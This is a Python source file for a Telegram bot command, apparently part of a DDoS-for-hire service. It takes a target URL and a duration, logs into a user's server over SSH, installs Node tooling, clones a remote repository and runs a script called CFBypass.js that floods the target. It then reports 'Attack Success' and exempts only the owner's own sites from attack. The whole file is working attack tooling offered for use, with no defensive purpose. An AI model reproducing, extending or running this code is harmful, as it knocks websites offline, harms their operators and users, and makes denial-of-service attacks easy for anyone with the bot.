from telethon import events,Button
import requests,os,time,json,paramiko,psutil,ipaddress
from dotenv import load_dotenv
load_dotenv()
MESSWAIT=os.getenv('MESSWAIT')
MESSDONE=os.getenv('MESSDONE')
async def cfpeler(event):
	J='user_id';F=event
	try:
		B=await F.reply(MESSWAIT);H=F.sender_id;G=F.raw_text.split()
		with open(f"./database/{H}.json",'r')as K:D=json.load(K)
		if J in D and D[J]==int(H):
			if len(G)==3:
				C=G[1];E=G[2]
				if E.isdigit():
					if not'cloudku.site'in C or'pterodactyl.my.id'in C:
						time.sleep(3);await B.edit(f"Connecting To Your Server...");L=D['server_host'];M=22;N=D['server_username'];O=D['server_password'];A=paramiko.SSHClient();A.set_missing_host_key_policy(paramiko.AutoAddPolicy())
						try:I=f"https://check-host.net/check-http?host={C}";await B.edit(f"**Attack Running**\n💻SITE : {C}\n🕑TIME : {E}s",buttons=[Button.url(f"check-host.net",f"{I}")]);A.connect(L,port=M,username=N,password=O);A.exec_command(f"apt install nodejs -y");A.exec_command(f"apt install npm -y");A.exec_command(f"apt install git -y");A.exec_command(f"git clone https://github.com/CasperCloudku/Server.git");S,T,U=A.exec_command(f"cd Server && npm install cloudscraper && npm install randomstring node CFBypass.js {C} {E}");P=psutil.cpu_percent();Q=psutil.virtual_memory().percent;time.sleep(int(E));A.exec_command(f"rm -rf Server");A.close();await B.edit(f"""**Attack Success**
💻SITE : {C}
🕑TIME : {E}s

**Output Server**
`Attacking | Bypass`

CPU Usage: {P}%
Memory Usage: {Q}%""",buttons=[Button.url(f"check-host.net",f"{I}")])
						except Exception as R:await B.edit(f"An error occurred\n\n`{R}`")
					else:await B.edit('Sorry you cannot DDoS my owner website :(')
				else:await B.edit('Use format example: /bypass https://example.com 100')
			else:await B.edit('Use format: /bypass <url> <time>')
		else:await B.edit('Lu gapunya server😹')
	except FileNotFoundError:await F.reply("You don't have a server to use this feature, please configure your server in the /server menu")